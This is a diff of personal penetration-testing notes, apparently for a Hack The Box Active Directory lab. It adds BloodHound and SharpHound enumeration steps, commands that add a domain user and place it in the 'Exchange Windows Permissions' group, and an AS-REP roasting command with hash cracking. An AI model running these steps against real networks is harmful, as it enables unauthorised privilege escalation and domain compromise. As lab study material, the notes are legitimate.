@@ -294,7 +294,21 @@ Password Protected SSH Private Key:
 		- Download the latest BloodHound release: git clone https://github.com/BloodHoundAD/BloodHound.git
 		- Start an smb share on the attacker machine: impacket-smbserver smb BloodHound/
 		- Download the following: wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.1.0/BloodHound-linux-x64.zip
-		- Start neo4j: neo4j console
+		- Start neo4j(You will be asked to intall it): sudo neo4j console
+			- Remote Interface at http://localhost:7474/browser/
+			- creds: neorj/neo4j
+		- Unzip the Linux BloodHound file and execute bloodhound: ./BloodHound --no-sandbox
+		- Now go the BloodHound Cloned Dir and upload SharpHound.exe into the vicitm machine
+			- Execute it: .\SharpHound.exe -c all
+			- export it to your machine. See notes above about extraction.
+		- Go back to bloodhound on your machine and upload the ip file you have extracted. 
+			- Once uploaded, start by searching users you have owned and mark them as owned. 
+			- We queried by shortest path from owned princeaples 
+			- We find we are able to add accounts, and we want to add it to the exchange server 
+				- Adding a user: net user <USername> <Password> /add /domain
+				- Adding user to Exhange group: net group "Exchange Windows Permissions" /add Sameh
+
+		
 
 
 			
@@ -304,6 +318,7 @@ Password Protected SSH Private Key:
 		- After getting usernames, if kerberos is running on port 88, then you might be able to get password hashes by running this
 			- python3 GetNPUsers.py  -dc-ip 10.10.10.161 htb.local/ -no-pass -usersfile users.txt
 			- Then use John to crack obtained hashes or even crackstation if you're lucky. 
+		
 
 			
 			
